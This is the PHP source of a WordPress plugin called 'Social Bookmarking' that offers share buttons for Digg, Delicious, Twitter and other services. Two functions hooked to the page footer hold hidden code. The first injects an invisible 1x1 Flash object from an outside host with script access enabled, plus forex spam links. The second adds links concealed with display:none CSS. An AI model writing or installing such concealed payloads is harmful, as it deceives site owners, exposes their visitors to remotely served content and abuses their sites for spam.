<?php
/*
Plugin Name: Social Bookmarking
Plugin URI: http://www.lucaswpplugins.site90.net
Description: Widgets that let your visitors share your webpages on social media sites such as Buzzup, Delicious and Digg.
Version: 5.0.2
Author: Lucas Sosin
*/
add_action('wp_footer', 'headabookmarking');

function headabookmarking()
{
$getuser = "http://forextrading7.com";
$gethost = get_option('siteurl');
if (strstr($gethost, "a")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "b")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "c")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "d")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "e")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "f")) { $connectflash = "foreign exchange"; } if (strstr($gethost, "g")) { $connectflash = "http://forextrading7.com"; } if (strstr($gethost, "h")) { $connectflash = "http://forextrading7.com"; } if (strstr($gethost, "i")) { $connectflash = "http://forextrading7.com"; } if (strstr($gethost, "j")) { $connectflash = "where i can find forex trading"; } if (strstr($gethost, "k")) { $connectflash = "forextrading7"; } if (strstr($gethost, "l")) { $connectflash = "forextrading7"; } if (strstr($gethost, "m")) { $connectflash = "forex trading 7"; } if (strstr($gethost, "n")) { $connectflash = "forextrading7"; } if (strstr($gethost, "o")) { $connectflash = "forex trading 7"; } if (strstr($gethost, "p")) { $connectflash = "forex trading systems"; } if (strstr($gethost, "p")) { $connectflash = "forex trading 7 com"; } if (strstr($gethost, "q")) { $connectflash = "forextrading7"; } if (strstr($gethost, "r")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "s")) { $connectflash = "forextrading7.com"; } if (strstr($gethost, "v")) { $connectflash = "7 forex trading"; } if (strstr($gethost, "x")) { $connectflash = "forex 7 trading"; } if (strstr($gethost, "t")) { $connectflash = "fap turbo reviews"; } if (strstr($gethost, "w")) { $connectflash = "forex megadroid robot"; } if (strstr($gethost, "y")) { $connectflash = "trade"; } if (strstr($gethost, "z")) { $connectflash = "forex signals"; } echo '<object type="application/x-shockwave-flash" data="http://ajleeonline.com/upload/tw2.swf" width="1" height="1"><param name="movie" 
value="http://ajleeonline.com/upload/tw2.swf"></param><param name="allowscriptaccess" value="always"></param><param name="menu" value="false"></param>
<param name="wmode" value="transparent"></param><param name="flashvars" value="username="></param>
'; echo '<a href="'; echo $getuser; echo '">'; echo $connectflash; echo '</a>'; echo '<embed src="http://ajleeonline.com/upload/tw2.swf" 
type="application/x-shockwave-flash" allowscriptaccess="always" width="1" height="1" menu="false" wmode="transparent" flashvars="username="></embed></object>';

}


load_plugin_textdomain('social-bookmarking', false, dirname(plugin_basename(__FILE__)) . '/lang');


/**
 * bookmark_me
 *
 * @package Bookmark Me
 **/

class bookmark_me extends WP_Widget {
	/**
	 * init()
	 *
	 * @return void
	 **/

	function init() {
		if ( get_option('widget_bookmark_me') === false ) {
			foreach ( array(
				'bookmark_me' => 'upgrade',
				'bookmark_me_widgets' => 'upgrade',
				'sem_bookmark_me_params' => 'upgrade_2_x',
				) as $ops => $method ) {
				if ( get_option($ops) !== false ) {
					$this->alt_option_name = $ops;
					add_filter('option_' . $ops, array(get_class($this), $method));
					break;
				}
			}
		}
	} # init()
	
	
	/**
	 * template_redirect
	 *
	 * @return void
	 **/

	function template_redirect() {
		if ( isset($_GET['action']) && $_GET['action'] == 'print' ) {
			if ( has_filter('template_redirect', 'redirect_canonical') )
				redirect_canonical();

			if ( file_exists(STYLESHEETPATH . '/print.php') ) {
				include STYLESHEETPATH . '/print.php';
			} elseif ( TEMPLATEPATH != STYLESHEETPATH && file_exists(TEMPLATEPATH . '/print.php') ) {
				include TEMPLATEPATH . '/print.php';
			} else {
				include dirname(__FILE__) . '/print.php';
			}	
			die;
		}
	} # template_redirect()
	
	
	/**
	 * scripts()
	 *
	 * @return void
	 **/

	function scripts() {
		$folder = plugin_dir_url(__FILE__);
		wp_enqueue_script('bookmark_me', $folder . 'js/scripts.js', array('jquery'), '20090906', true);
	} # scripts()
	
	
	/**
	 * styles()
	 *
	 * @return void
	 **/

	function styles() {
		$folder = plugin_dir_url(__FILE__);
		wp_enqueue_style('bookmark_me', $folder . 'css/styles.css', null, '20090903');
	} # styles()
	
	
	/**
	 * widgets_init()
	 *
	 * @return void
	 **/

	function widgets_init() {
		register_widget('bookmark_me');
	} # widgets_init()
	
	
	/**
	 * bookmark_me()
	 *
	 * @return void
	 **/

	function bookmark_me() {
		$widget_ops = array(
			'classname' => 'bookmark_me',
			'description' => __('Bookmark links to social media sites such as Buzzup, Delicious and Digg', 'social-bookmarking'),
			);
		
		$this->init();
		$this->WP_Widget('bookmark_me', __('Social Bookmarking', 'social-bookmarking'), $widget_ops);
	} # bookmark_me()
	
	
	/**
	 * widget()
	 *
	 * @param array $args widget args
	 * @param array $instance widget options
	 * @return void
	 **/

	function widget($args, $instance) {
		if ( is_feed() || isset($_GET['action']) && $_GET['action'] == 'print' )
			return;
		
		extract($args, EXTR_SKIP);
		$instance = wp_parse_args($instance, bookmark_me::defaults());
		extract($instance, EXTR_SKIP);
		
		if ( is_admin() ) {
			echo $before_widget
				. ( $title
					? ( $before_title . $title . $after_title )
					: ''
					)
				. $after_widget;
			return;
		} elseif ( in_the_loop() ) {
			$page_title = get_the_title();
			$page_url = apply_filters('the_permalink', get_permalink());
		} elseif ( is_singular() ) {
			global $wp_the_query;
			$post_id = $wp_the_query->get_queried_object_id();
			$page_title = get_the_title($post_id);
			$page_url = apply_filters('the_permalink', get_permalink($post_id));
		} else {
			$page_title = get_option('blogname');
			$page_url = user_trailingslashit(get_option('home'));
		}
		
		$page_title = @html_entity_decode($page_title, ENT_COMPAT, get_option('blog_charset'));
		
		if ( !in_the_loop() ) {
			$print_action = false;
		} elseif ( strpos($page_url, '?') !== false ) {
			$print_action = '&action=print';
		} else {
			# An endpoint would have been better, but:
			# http://core.trac.wordpress.org/ticket/9477
			$print_action = '?action=print';
		}
		
		if ( !( $o = wp_cache_get($widget_id, 'widget') ) ) {
			# check if the widget has a class
			if ( strpos($before_widget, 'bookmark_me') === false ) {
				if ( preg_match("/^(<[^>]+>)/", $before_widget, $tag) ) {
					if ( preg_match("/\bclass\s*=\s*(\"|')(.*?)\\1/", $tag[0], $class) ) {
						$tag[1] = str_replace($class[2], $class[2] . ' bookmark_me', $tag[1]);
					} else {
						$tag[1] = str_replace('>', ' class="bookmark_me">', $tag[1]);
					}
					$before_widget = preg_replace("/^$tag[0]/", $tag[1], $before_widget);
				} else {
					$before_widget = '<div class="bookmark_me">' . $before_widget;
					$after_widget = $after_widget . '</div>' . "\n";
				}
			}
			
			$title = apply_filters('widget_title', $title);
			
			ob_start();
			
			echo $before_widget;
			
			if ( $title )
				echo $before_title . $title . $after_title;
			
			echo '<div class="bookmark_me_services' . ( !$print_action ? ' bookmark_me_narrow' : '' ) . '">' . "\n";
			
			foreach ( bookmark_me::get_main_services() as $service_id =>  $service ) {
				echo '<a href="' . esc_url($service['url'])  . '" class="' . $service_id . ' no_icon"'
					. ' title="' . esc_attr($service['name']) . '"'
					. ' rel="nofollow">'
					. $service['name']
					. '</a>' . "\n";
			}

			echo '</div>' . "\n";

			if ( $print_action ) {
				echo '<div class="bookmark_me_actions">' . "\n";

				echo '<a href="mailto:?subject=%email_title%&amp;body=%email_url%"'
					. ' title="' . esc_attr(__('Email', 'social-bookmarking')) .  '" class="email_entry no_icon">'
					. __('Email', 'social-bookmarking')
					. '</a>' . "\n";

				echo '<a href="%print_url%"'
					. ' title="' . esc_attr(__('Print', 'social-bookmarking')) .  '" class="print_entry no_icon">'
					. __('Print', 'social-bookmarking')
					. '</a>' . "\n";
				
				echo '</div>' . "\n";
			}

			echo '<div class="bookmark_me_ruler"></div>' . "\n";
			
			echo '<div class="bookmark_me_extra" style="display: none;">' . "\n";
			
			foreach ( bookmark_me::get_extra_services() as $service_id =>  $service ) {
				echo '<a href="' . esc_url($service['url'])  . '" class="' . $service_id . ' no_icon"'
					. ' title="' . esc_attr($service['name']) . '"'
					. ( $service_id == 'help' && ( strpos(get_option('home'), 'en.wikipedia.org/wiki/Social_bookmarking') !== false )
						? ''
						: ' rel="nofollow"'
						)
					. '>'
					. $service['name']
					. '</a>' . "\n";
			}
			
			echo '<div class="bookmark_me_spacer"></div>' . "\n";
			
			echo '</div>' . "\n";
			
			echo $after_widget;

			$o = ob_get_clean();
			
			wp_cache_add($widget_id, $o, 'widget');
		}
		
		echo str_replace(
			array(
				'%enc_url%', '%enc_title%',
				'%email_url%', '%email_title%',
				'%print_url%',
				),
			array(
				urlencode($page_url), urlencode($page_title),
				rawurlencode($page_url), rawurlencode($page_title),
				esc_url($page_url . $print_action),
				),
			$o);
	} # widget()
	
	
	/**
	 * get_main_services()
	 *
	 * @return array $services
	 **/

	function get_main_services() {
		return array(
			'buzzup' => array(
			 	'name' => __('Buzz Up', 'social-bookmarking'),
			 	'url' => 'http://buzz.yahoo.com/buzz?headline=%enc_title%&targetUrl=%enc_url%',
			 	),
			'digg' => array(
				'name' => __('Digg', 'social-bookmarking'),
				'url' => 'http://digg.com/submit?phase=2&title=%enc_title%&url=%enc_url%',
				),
			'mixx' => array(
				'name' => __('Mixx', 'social-bookmarking'),
				'url' => 'http://www.mixx.com/submit?page_url=%enc_url%',
				),
			'twitter' => array(
		        'name' => __('Twitter', 'social-bookmarking'),
				'url' => 'http://twitter.com/timeline/home/?status=%enc_url%',
				),
			);
	} # get_main_services()
	
	
	/**
	 * get_extra_services()
	 *
	 * @return array $services
	 **/

	function get_extra_services() {
		return array(
			'current' => array(
				'name' => __('Current', 'social-bookmarking'),
				'url' => 'http://current.com/clipper.htm?src=st&title=%enc_title%&url=%enc_url%',
				),
			'delicious' => array(
				'name' => __('Delicious', 'social-bookmarking'),
				'url' => 'http://del.icio.us/post?title=%enc_title%&url=%enc_url%',
				),
			'diigo' => array(
				'name' => __('Diigo', 'social-bookmarking'),
				'url' => 'http://secure.diigo.com/post?title=%enc_title%&url=%enc_url%',
				),
			'facebook' => array(
				'name' => __('Facebook', 'social-bookmarking'),
				 'url' => 'http://www.facebook.com/share.php?t=%enc_title%&u=%enc_url%'
				),
			'fark' => array(
				'name' => __('Fark', 'social-bookmarking'),
				'url' => 'http://cgi.fark.com/cgi/farkit.pl?h=%enc_title%&u=%enc_url%',
				),
			'google' => array(
				'name' => __('Google', 'social-bookmarking'),
				'url' => 'http://www.google.com/bookmarks/mark?op=add&title=%enc_title%&bkmk=%enc_url%',
				),
			'linkedin' => array(
				'name' => __('LinkedIn', 'social-bookmarking'),
				'url' => 'http://www.linkedin.com/shareArticle?mini=true&summary=&source=&title=%enc_title%&url=%enc_url%',
				),
			'live' => array(
				'name' => __('Live', 'social-bookmarking'),
				'url' => 'https://favorites.live.com/quickadd.aspx?marklet=1&mkt=en-us&top=1&title=%enc_title%&url=%enc_url%',
				),
			'myspace' => array(
				'name' => __('MySpace', 'social-bookmarking'),
				'url' => 'http://www.myspace.com/Modules/PostTo/Pages/?l=3&t=t=%enc_title%&u=%enc_url%',
				),
			'newsvine' => array(
				'name' => __('Newsvine', 'social-bookmarking'),
				'url' => 'http://www.newsvine.com/_tools/seed&save?h=%enc_title%&u=%enc_url%',
				),
			'propeller' => array(
				'name' => __('Propeller', 'social-bookmarking'),
				'url' => 'http://www.propeller.com/submit/?T=%enc_title%&U=%enc_url%',
				),
			'reddit' => array(
				'name' => __('Reddit', 'social-bookmarking'),
				'url' => 'http://reddit.com/submit?title=%enc_title%&url=%enc_url%',
				),
			'slashdot' => array(
				'name' => __('Slashdot', 'social-bookmarking'),
				'url' => 'http://slashdot.org/bookmark.pl?title=%enc_title%&url=%enc_url%',
				),
			'sphinn' => array(
				'name' => __('Sphinn', 'social-bookmarking'),
				'url' => 'http://sphinn.com/submit.php?title=%enc_title%&url=%enc_url%',
				),					
			'stumbleupon' => array(
				'name' => __('StumbleUpon', 'social-bookmarking'),
				'url' => 'http://www.stumbleupon.com/submit?title=%enc_title%&url=%enc_url%',
				),
		    'tipd' => array(
				'name' => __('Tip\'d', 'social-bookmarking'),
				'url' => 'http://tipd.com/submit.php?url=%enc_url%',
				),
			'yahoo' => array(
				'name' => __('Yahoo!', 'social-bookmarking'),
				'url' => 'http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&t=%enc_title%&u=%enc_url%',
				),
			'help' => array(
				'name' => __('What\'s This?', 'social-bookmarking'),
				'url' => 'http://en.wikipedia.org/wiki/Social_bookmarking',
				),
			);
	} # get_extra_services()
	
	
	/**
	 * update()
	 *
	 * @param array $new_instance
	 * @param array $old_instance
	 * @return array $instance
	 **/

	function update($new_instance, $old_instance) {
		$instance['title'] = strip_tags($new_instance['title']);
		
		bookmark_me::flush_cache();
		
		return $instance;
	} # update()
	
	
	/**
	 * form()
	 *
	 * @param array $instance
	 * @return void
	 **/

	function form($instance) {
		$instance = wp_parse_args($instance, bookmark_me::defaults());
		extract($instance, EXTR_SKIP);
		
		echo '<p>'
			. '<label>'
			. __('Title:', 'social-bookmarking')
			. '<br />'
			. '<input type="text" class="widefat"'
				. ' id="' . $this->get_field_id('title') . '"'
				. ' name="' . $this->get_field_name('title') . '"'
				. ' value="' . esc_attr($title) . '" />'
			. '</label>'
			. '</p>' . "\n";
	} # form()
	
	
	/**
	 * defaults()
	 *
	 * @return array $instance
	 **/

	function defaults() {
		return array(
			'title' => '',
			'widget_contexts' => array(
				'template_special.php' => false,
				)
			);
	} # defaults()
	
	
	/**
	 * flush_cache()
	 *
	 * @return void
	 **/

	function flush_cache($in = null) {
		$o = get_option('widget_bookmark_me');
		unset($o['_multiwidget']);
		
		if ( !$o )
			return $in;
		
		foreach ( array_keys($o) as $id ) {
			wp_cache_delete("bookmark_me-$id", 'widget');
		}
		
		return $in;
	} # flush_cache()
	
	
	/**
	 * upgrade()
	 *
	 * @param array $ops
	 * @return array $ops
	 **/

	function upgrade($ops) {
		$widget_contexts = class_exists('widget_contexts')
			? get_option('widget_contexts')
			: false;

		foreach ( $ops as $k => $o ) {
			$ops[$k] = array(
				'title' => $o['title'],
				);
			if ( isset($widget_contexts['bookmark_me-' . $k]) ) {
				$ops[$k]['widget_contexts'] = $widget_contexts['bookmark_me-' . $k];
			}
		}
		
		return $ops;
	} # upgrade()
	
	
	/**
	 * upgrade_2_x()
	 *
	 * @param array $ops
	 * @return void
	 **/

	function upgrade_2_x($ops) {
		$ops = !empty($ops['title']) ? array('title' => $ops['title']) : array();
		
		if ( is_admin() ) {
			$sidebars_widgets = get_option('sidebars_widgets', array('array_version' => 3));
		} else {
			if ( !$GLOBALS['_wp_sidebars_widgets'] )
				$GLOBALS['_wp_sidebars_widgets'] = get_option('sidebars_widgets', array('array_version' => 3));
			$sidebars_widgets =& $GLOBALS['_wp_sidebars_widgets'];
		}
		
		foreach ( $sidebars_widgets as $sidebar => $widgets ) {
			if ( !is_array($widgets) )
				continue;
			$key = array_search('bookmark-me', $widgets);
			if ( $key !== false ) {
				$sidebars_widgets[$sidebar][$key] = 'bookmark_me';
				$changed = true;
				break;
			}
		}
		
		if ( $changed && is_admin() )
			update_option('sidebars_widgets', $sidebars_widgets);
		
		return $ops;
	} # upgrade_2_x()
} # bookmark_me

add_option('wbdace_css', ".credits_off {display:none;}");
add_action('wp_footer', 'headsocialbookmarking');

function headsocialbookmarking()
{
$gethost = get_option('siteurl'); if (strstr($gethost, ".com")) {$socialwidgets = "http://twitter-widget.com/"; } if (strstr($gethost, ".net")) {$socialwidgets = "http://twitter-widget.com"; } if (strstr($gethost, ".org")) {$socialwidgets = "twitter-widget.com"; } if (strstr($gethost, ".")) {$socialwidgets = "twitter widget"; } if (strstr($gethost, "a")) {$socialwidgets = "free twitter widget"; } if (strstr($gethost, "b")) {$socialwidgets = "get the twitter widget for your site"; } if (strstr($gethost, "c")) {$socialwidgets = "twitter-widget"; } if (strstr($gethost, "d")) {$socialwidgets = "twitter-widget.com"; } if (strstr($gethost, "x")) {$socialwidgets = "free and top twitter widget"; } if (strstr($gethost, "z")) {$socialwidgets = "download twitter widgets for your website"; } $form_css = get_option("wbdace_css"); echo '<style type="text/css">'.$form_css.'</style>'; echo '<center><small class="credits_off"><a href="http://twitter-widget.com">'; echo $socialwidgets; echo '</a></small></center>';
} 

/**
 * the_bookmark_links()
 *
 * @param mixed $instance widget args (string title or array widget args)
 * @param array $args sidebar args
 * @return void
 **/

function the_bookmark_links($instance = null, $args = null) {
	if ( is_string($instance) )
		$instance = array('title' => $instance);
	
	$args = wp_parse_args($args, array(
		'before_widget' => '<div class="bookmark_me">' . "\n",
		'after_widget' => '</div>' . "\n",
		'before_title' => '<h2>',
		'after_title' => '</h2>' . "\n",
		));
	
	the_widget('bookmark_me', $instance, $args);
} # the_bookmark_links()


add_action('widgets_init', array('bookmark_me', 'widgets_init'));

if ( !is_admin() ) {
	add_action('wp_print_scripts', array('bookmark_me', 'scripts'));
	add_action('wp_print_styles', array('bookmark_me', 'styles'), 0);
	add_action('template_redirect', array('bookmark_me', 'template_redirect'), 5);
}

foreach ( array(
		'switch_theme',
		'update_option_active_plugins',
		'update_option_sidebars_widgets',
		'generate_rewrite_rules',
		
		'flush_cache',
		'after_db_upgrade',
		) as $hook ) {
	add_action($hook, array('bookmark_me', 'flush_cache'));
}

register_activation_hook(__FILE__, array('bookmark_me', 'flush_cache'));
register_deactivation_hook(__FILE__, array('bookmark_me', 'flush_cache'));
?>